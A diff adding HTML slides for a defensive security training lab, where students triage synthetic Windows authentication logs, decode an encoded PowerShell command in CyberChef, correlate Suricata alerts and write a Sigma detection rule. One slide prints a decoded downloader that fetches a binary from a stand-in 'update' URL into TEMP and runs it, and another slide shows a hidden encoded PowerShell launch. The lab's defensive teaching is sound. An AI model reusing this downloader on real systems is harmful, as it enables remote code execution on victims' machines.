+                      <tr><td style="color: #FFF;">Environment:</td><td>Python 3.12 (<code>pandas</code>, <code>json</code>)</td></tr>
+                      <tr><td style="color: #FFF;">Interface:</td><td>VS Code / JupyterLab + CyberChef (Offline)</td></tr>
+                      <tr><td style="color: #FFF;">Auth Logs:</td><td><code>auth_events.json</code> (2,500 synthetic events)</td></tr>
+                      <tr><td style="color: #FFF;">Network Logs:</td><td><code>network_alerts.json</code> (1,200 Suricata records)</td></tr>
+                    </table>
+                  </div>
+                  
+                  <div class="cyber-card">
+                    <strong style="color: var(--neon-amber); font-size: 13px;">⚡ Pre-Flight Verification Commands</strong>
+                    <p style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Verify dataset sizes and line counts in PowerShell:</p>
+                    <div class="terminal-buffer" style="margin-top: 8px; font-size: 11px;">
+                      <div class="terminal-body">
+<span class="terminal-cmd"># 1. Confirm dataset file sizes and records</span>
+Get-Item "C:\Threat_Intel_IR_2026\06_Datasets_and_Examples\auth_events.json" | Select-Object Length
+Get-Item "C:\Threat_Intel_IR_2026\06_Datasets_and_Examples\network_alerts.json" | Select-Object Length
+<span class="terminal-cmd"># 2. Test pandas import in active environment</span>
+python -c "import pandas as pd; print('Pandas Ready: ' + pd.__version__)"
+                      </div>
+                    </div>
+                    <div style="font-size: 10px; color: var(--emerald-pass); margin-top: 4px;">✓ Expected response: Valid file sizes and Pandas version printed</div>
+                  </div>
+                </div>
+              </div>
+            
+        <aside class="notes">
+          [SAY:] Check your file paths before launching your notebook. If your system has limited RAM, use the chunksize parameter when reading the JSON files.
+          [PEDAGOGY:] Ensure all students have opened their Python interactive session or JupyterLab before starting Phase 1.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 12: LAB 04 (Part 3/7): Step-by-Step Procedure -->
+      <section data-day="DAY 04" data-module="MOD-04: ENTERPRISE TELEMETRY & SIGMA" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Lab Manual 4 — Section 4.4">
+
+              <div style="text-align: left;">
+                <div class="cyber-badge badge-amber">LAB-04: STEP 3 OF 7 // EXECUTION PROTOCOL</div>
+                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">3-Phase Practical Correlation Workflow</h2>
+                <p style="color: var(--text-secondary); font-size: 0.95rem;">Execute authentication triage, command-line de-obfuscation, and network correlation.</p>
+                
+                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 14px;">
+                  <div class="cyber-card" style="padding: 12px 16px;">
+                    <strong style="color: var(--cyber-cyan); font-size: 12px;">PHASE 1: Authentication Log Triage (Minutes 00–30)</strong>
+                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
+                      <li>Ingest <code>auth_events.json</code> into a pandas DataFrame. Filter for Event ID <code>4625</code> (Failed Logon).</li>
+                      <li>Run <code>value_counts()</code> on <code>TargetUserName</code> to identify targeted account: <code>svc_backup_admin</code> (42 failures).</li>
+                      <li>Filter for Event ID <code>4624</code> (Logon Type 10 - Remote Desktop) immediately following the cluster. Record compromised timestamp.</li>
+                    </ol>
+                  </div>
+                  
+                  <div class="cyber-card" style="padding: 12px 16px;">
+                    <strong style="color: var(--electric-blue); font-size: 12px;">PHASE 2: Process Creation & De-obfuscation (Minutes 30–60)</strong>
+                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
+                      <li>Filter DataFrame for Event ID <code>4688</code> spawned under <code>svc_backup_admin</code> session.</li>
+                      <li>Extract suspicious command: <code>powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBP...</code>.</li>
+                      <li>Open CyberChef -> Recipe: <code>From Base64</code> -> <code>Decode text (UTF-16LE)</code>. Extract second-stage C2 URL.</li>
+                    </ol>
+                  </div>
+
+                  <div class="cyber-card" style="padding: 12px 16px;">
+                    <strong style="color: var(--emerald-pass); font-size: 12px;">PHASE 3: Cross-Sensor Correlation with Network IDS (Minutes 60–85)</strong>
+                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
+                      <li>Ingest <code>network_alerts.json</code>. Match compromised workstation IP <code>10.14.22.109</code>.</li>
+                      <li>Locate outbound alert to <code>198.51.100.45:8443</code> matching signature <code>ET MALWARE Cobalt Strike Beacon</code>.</li>
+                      <li>Construct unified timeline linking brute force -> successful logon -> payload launch -> outbound beacon.</li>
+                    </ol>
+                  </div>
+                </div>
+              </div>
+            
+        <aside class="notes">
+          [SAY:] Notice that CyberChef requires UTF-16LE decoding because PowerShell encodes wide strings in base64. If you select UTF-8, you will see garbled null-byte text.
+          [PEDAGOGY:] Ensure students understand why Logon Type 10 signifies RDP rather than local console logon (Type 2).
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 13: LAB 04 (Part 4/7): Expected Output & Decoded Payload -->
+      <section data-day="DAY 04" data-module="MOD-04: ENTERPRISE TELEMETRY & SIGMA" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Lab Manual 4 — Section 4.5">
+
+              <div style="text-align: left;">
+                <div class="cyber-badge badge-green">LAB-04: STEP 4 OF 7 // VERIFIED ARTIFACTS</div>
+                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Expected Triage Outputs & Correlated Evidence</h2>
+                <p style="color: var(--text-secondary); font-size: 0.95rem;">Verify your findings against the verified decoded command-line payload.</p>
+                
+                <div class="grid-2" style="margin-top: 14px;">
+                  <div>
+                    <strong style="color: var(--cyber-cyan); font-size: 12px;">Decoded CyberChef PowerShell Payload:</strong>
+                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px; max-height: 240px; overflow-y: auto;">
+                      <div class="terminal-body">
+[CyberChef Decoded Output: UTF-16LE]
+$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIC..."));
+$b=New-Object Byte[](1024);
+$z=New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress);
+$u="https://internal-sync.com/update/patch-v4.bin";
+(New-Object Net.WebClient).DownloadFile($u, "$env:TEMP\winupdate.exe");
+Start-Process "$env:TEMP\winupdate.exe";
+                      </div>
+                    </div>
+                  </div>
+
+                  <div>
+                    <strong style="color: var(--emerald-pass); font-size: 12px;">Correlated Master Chronology:</strong>
+                    <div class="cyber-card" style="margin-top: 6px; font-size: 11px; line-height: 1.6;">
+                      <table style="width: 100%; font-size: 10px; color: var(--text-secondary);">
+                        <tr style="color: #FFF;"><th>Timestamp (UTC)</th><th>Sensor</th><th>Observed Event</th></tr>
+                        <tr><td>14:12:00</td><td>Windows Auth</td><td>42 Failed Logons (EID 4625) -> svc_backup_admin</td></tr>
+                        <tr><td>14:14:10</td><td>Windows Auth</td><td>Successful Logon (EID 4624, Type 10) from 10.14.22.109</td></tr>
+                        <tr><td>14:15:30</td><td>Process EID 4688</td><td>powershell.exe executes encoded downloader</td></tr>
+                        <tr><td>14:16:02</td><td>Suricata IDS</td><td>ET MALWARE Outbound TLS Beacon to 198.51.100.45:8443</td></tr>
+                      </table>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            
+        <aside class="notes">
+          [SAY:] When you put those four lines together in your chronology, the attack story becomes unmistakable: brute force, RDP breach, payload download, active C2.
+          [PEDAGOGY:] Have students verify that the domain internal-sync.com matches the certificate findings from Lab 1.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 14: LAB 04 (Part 5/7): Technical Interpretation -->
+      <section data-day="DAY 04" data-module="MOD-04: ENTERPRISE TELEMETRY & SIGMA" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Lab Manual 4 — Section 4.5.2">
+
+              <div style="text-align: left;">
+                <div class="cyber-badge badge-cyan">LAB-04: STEP 5 OF 7 // ANALYTICAL SYNTHESIS</div>
+                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Analytical Synthesis & Sigma Detection Rule Design</h2>
+                <p style="color: var(--text-secondary); font-size: 0.95rem;">Converting observed attack telemetry into vendor-neutral Sigma detection rules.</p>
+                
+                <div class="grid-2" style="margin-top: 16px;">
+                  <div class="cyber-card">
+                    <strong style="color: var(--emerald-pass); font-size: 13px;">🛡️ Analytical Findings Established</strong>
+                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
+                      <li>Account <code>svc_backup_admin</code> lacked multi-factor authentication (MFA) on internal RDP listeners.</li>
+                      <li>Process execution bypassed default AppLocker policies by downloading into <code>$env:TEMP</code>.</li>
+                      <li>Cross-correlation confirms that network IDS alert was triggered directly by the decoded PowerShell binary.</li>
+                    </ul>
+                  </div>
+                  
+                  <div class="cyber-card">
+                    <strong style="color: var(--purple-intel); font-size: 13px;">📜 Transpiled Sigma Detection Rule</strong>
+                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
+                      <div class="terminal-body">
+title: Suspicious PowerShell Download into Temp
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4688
+    CommandLine|contains|all:
+      - 'powershell'
+      - 'DownloadFile'
+      - 'AppData\Local\Temp'
+  condition: selection
+level: high
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            
+        <aside class="notes">
+          [SAY:] This is how we close the defensive loop: we investigate the breach, and then we immediately write a Sigma rule so that no other endpoint in the enterprise can suffer the same attack unnoticed.
+          [PEDAGOGY:] Explain that Sigma rules transpile into Splunk, Elastic, Sentinel, and QRadar queries.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 15: LAB 04 (Part 6/7): Troubleshooting & Recovery -->
+      <section data-day="DAY 04" data-module="MOD-04: ENTERPRISE TELEMETRY & SIGMA" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Lab Manual 4 — Section 4.7">
+
+              <div style="text-align: left;">
+                <div class="cyber-badge badge-red">LAB-04: STEP 6 OF 7 // ERROR RESOLUTION & RECOVERY</div>
+                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Common Telemetry Analysis Errors & Fixes</h2>
+                <p style="color: var(--text-secondary); font-size: 0.95rem;">Handling Pandas memory constraints and CyberChef decoding failures.</p>
+                
+                <div class="grid-2" style="margin-top: 14px;">
+                  <div class="cyber-card">
+                    <strong style="color: var(--alert-crimson); font-size: 12px;">Issue 1: MemoryError when Loading 2,500 JSON Events</strong>
+                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Occurs if Python tries to read the entire file into an unindexed single dataframe object.</p>
+                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
+                      <div class="terminal-body">
+<span class="terminal-cmd"># Recovery: Process in iterative chunks</span>
+chunks = pd.read_json('auth_events.json', lines=True, chunksize=500)
+df_auth = pd.concat([c[c['EventID'].isin([4624, 4625, 4688])] for c in chunks])
+                      </div>
+                    </div>
+                  </div>
+
+                  <div class="cyber-card">
+                    <strong style="color: var(--neon-amber); font-size: 12px;">Issue 2: CyberChef Output Shows Chinese or Garbled Characters</strong>
+                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Encoding recipe set to UTF-8 or ASCII instead of UTF-16LE.</p>
+                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
+                      <div class="terminal-body">
+<span class="terminal-cmd"># Recovery: In CyberChef recipe panel:</span>
+<span class="terminal-cmd">1. Remove 'Decode text' or set encoding dropdown to 'UTF-16LE (1200)'</span>
+<span class="terminal-cmd">2. Verify that command text renders readable PowerShell syntax</span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            
+        <aside class="notes">
+          [SAY:] If you see Chinese characters in CyberChef, you picked the wrong text encoding. PowerShell base64 is UTF-16 Little Endian.
+          [PEDAGOGY:] Have students experiment switching between UTF-8 and UTF-16LE in CyberChef to see the difference visually.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 16: LAB 04 (Part 7/7): Completion & Assessment -->
+      <section data-day="DAY 04" data-module="MOD-04: ENTERPRISE TELEMETRY & SIGMA" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Lab Manual 4 — Section 4.6">
+
+              <div style="text-align: left;">
+                <div class="cyber-badge badge-cyan">LAB-04: STEP 7 OF 7 // VERIFICATION & GRADING</div>
+                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Deliverable Checklist & Assessment Rubric</h2>
+                <p style="color: var(--text-secondary); font-size: 0.95rem;">Confirm all analysis findings and timeline artifacts are saved.</p>
+                
+                <div class="grid-2" style="margin-top: 16px;">
+                  <div class="cyber-card">
+                    <strong style="color: var(--cyber-cyan); font-size: 13px;">📋 Completion Checklist</strong>
+                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.8;">
+                      <li>[ ] Compromised user account <code>svc_backup_admin</code> accurately identified.</li>
+                      <li>[ ] Base64 payload decoded; second-stage URL extracted and defanged.</li>
+                      <li>[ ] Unified 4-event chronological table mapping Windows & Suricata logs saved.</li>
+                      <li>[ ] Sigma detection rule YAML artifact created and validated.</li>
+                    </ul>
+                  </div>
+
+                  <div class="cyber-card">
+                    <strong style="color: var(--emerald-pass); font-size: 13px;">⚖️ Assessment Rubric (100 Points)</strong>
+                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
+                      <tr><td style="color: #FFF;">Authentication Log Triage:</td><td><strong>35 Pts</strong> (Identified brute force & successful EID 4624)</td></tr>
+                      <tr><td style="color: #FFF;">Payload De-obfuscation:</td><td><strong>35 Pts</strong> (Decoded UTF-16LE & extracted C2 URL)</td></tr>
+                      <tr><td style="color: #FFF;">Multi-Sensor Timeline Correlation:</td><td><strong>30 Pts</strong> (Unified endpoint & network telemetry)</td></tr>
+                      <tr><td style="color: var(--cyber-cyan);">Total Passing Standard:</td><td><strong>75% or higher</strong></td></tr>
+                    </table>
+                  </div>
+                </div>
+                
+                <div style="text-align: center; margin-top: 16px;">
+                  <span class="cyber-badge badge-green" style="font-size: 12px; padding: 6px 18px;">LAB-04 OFFICIAL COMPLETION VERIFIED // PROCEED TO KNOWLEDGE CHECK</span>
+                </div>
+              </div>
+            
+        <aside class="notes">
+          [SAY:] Make sure your correlated table and Sigma YAML are saved in your lab folder. Pod leads, please verify that each workstation has decoded the C2 URL.
+          [PEDAGOGY:] Highlight the transition from detection to incident response, setting up tomorrow's NIST triage workflows.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 17: Day 4 Knowledge Check -->
+      <section data-day="DAY 04" data-module="MOD-04: TELEMETRY & SIEM" data-session="1:00 PM – 5:00 PM" data-ref="Trainer Handbook Section 4.7">
+
+          <div style="text-align: left;">
+            <div class="cyber-badge badge-amber">END-OF-DAY CHECKPOINT</div>
+            <h2>Day 4 Knowledge Check: Telemetry Mastery</h2>
+            <p>Verify your understanding of cross-source correlation before we move to digital forensics.</p>
+            
+            <div class="interactive-decision-box" style="margin-top: 20px;">
+              <strong style="color: #FFF; font-size: 15px;">Question for Pod 3 & Pod 4:</strong>
+              <p style="font-size: 13px; color: var(--text-secondary); margin: 8px 0 14px 0;">
+                An attacker compromises an internal server and executes a living-off-the-land command. To evade detection, they use an unmanaged script that modifies the local Windows command-line string. Which network sensor guarantees unforgeable visibility of the outbound connection, and why?
+              </p>
+              <div class="decision-options">
+                <button class="decision-btn" onclick="selectDecision(this, false, 'Endpoint logs can be manipulated if the adversary achieves SYSTEM privileges.')">
+                  <span>A) Windows Security Event ID 4688, because endpoint operating systems can never be bypassed.</span>
+                  <span>➔</span>
+                </button>
+                <button class="decision-btn" onclick="selectDecision(this, true, 'Correct! Zeek inspects the raw physical network packets on the wire (out-of-band). Even if an adversary compromises the host kernel, they cannot forge the TCP 3-way handshake recorded by the network tap.')">
+                  <span>B) Zeek conn.log, because out-of-band network packet capture records wire truth independent of compromised host OS state.</span>
+                  <span>➔</span>
+                </button>
+              </div>
+              <div class="decision-explanation" style="margin-top: 12px; font-size: 13px; font-family: var(--font-mono);"></div>
+            </div>
+          </div>
+        
+        <aside class="notes">
+          [SAY:] Pod 3 and Pod 4, review the question. Why is Zeek unforgeable? Exactly! The wire doesn't lie. Even if an attacker has root on a server, the network switch tap records the raw TCP packets. That is wire truth.
+          [PEDAGOGY:] Reinforce the principle of out-of-band wire truth. Bridge to Day 5: forensic triage.
+        </aside>
+      </section>
+
+
+      <!-- DAY 04 - CONCLUSION & PORTAL RETURN -->
+      <section data-day="DAY 04" data-module="WRAP-UP & ADJOURNMENT" data-session="1:00 PM – 5:00 PM" data-ref="Course Syllabus">
+        <div style="text-align: center; padding: 30px 10px;">
+          <div class="cyber-badge badge-teal" style="margin-bottom: 15px;">DAY 04 ADJOURNMENT</div>
+          <h2>Session Concluded: Multi-Source Enterprise Telemetry Correlation & Sigma Detection Rules</h2>
+          <p style="color: var(--text-secondary); max-width: 780px; margin: 0 auto 25px auto; font-size: 15px;">
+            You have completed all planned instructional milestones, practical demonstrations, and lab exercises for Thursday, 29 October 2026.
+          </p>
+          
+          <div class="grid-2" style="max-width: 800px; margin: 0 auto 30px auto; text-align: left;">
+            <div class="cyber-card">
+              <strong style="color: var(--day-accent); font-size: 14px;">Today's Completed Practical Milestones</strong>
+              <div style="font-size: 12px; color: var(--text-secondary); margin-top: 8px;">
+                DEMO-04: Telemetry Pivot | LAB-04: Multi-Source Telemetry & Sigma Rules
+              </div>
+            </div>
+            <div class="cyber-card">
+              <strong style="color: var(--neon-amber); font-size: 14px;">Next Session Briefing</strong>
+              <div style="font-size: 12px; color: var(--text-secondary); margin-top: 8px;">
+                NIST Incident Response, RFC 3227 Volatility & Forensic Triage Acquisition
+              </div>
+            </div>
+          </div>
+          
+          <div style="display: flex; justify-content: center; gap: 15px;">
+            <a href="../index.html" class="portal-home-btn" style="padding: 10px 24px; font-size: 13px;">⊞ RETURN TO MASTER PORTAL</a>
+            <a href="../day-05/index.html" class="nav-day-btn" style="padding: 10px 24px; font-size: 13px; background: var(--day-accent); color: #050814; font-weight: bold;">LAUNCH DAY 05 ▶</a>
+          </div>
+        </div>
+      </section>
+    
+    </div>
+  </div>
+
+  <!-- Shared Script Engines: Reveal.js, GSAP, Three.js, Mascots & Narratives -->
+  <script src="../shared/js/reveal.js"></script>
+  <script src="../shared/js/gsap.min.js"></script>
+  <script src="../shared/js/three.min.js"></script>
+  <script src="../shared/js/characters.js"></script>
+  <script src="../shared/js/cyber-3d.js"></script>
+  <script src="../shared/js/gsap-narratives.js"></script>
+  <script src="../shared/js/presentation-app.js"></script>
+  <script>
+    Reveal.on('slidechanged', event => {
+      const counterEl = document.getElementById('custom-slide-counter');
+      if (counterEl) {
+        const current = Reveal.getSlidePastCount() + 1;
+        const total = Reveal.getTotalSlides();
+        counterEl.innerHTML = `DAY 04: SLIDE <span>${String(current).padStart(2, '0')}</span> / ${String(total).padStart(2, '0')}`;
+      }
+    });
+    Reveal.on('ready', event => {
+      const counterEl = document.getElementById('custom-slide-counter');
+      if (counterEl) {
+        const current = Reveal.getSlidePastCount() + 1;
+        const total = Reveal.getTotalSlides();
+        counterEl.innerHTML = `DAY 04: SLIDE <span>${String(current).padStart(2, '0')}</span> / ${String(total).padStart(2, '0')}`;
+      }
+    });
+  </script>
+</body>
+</html>
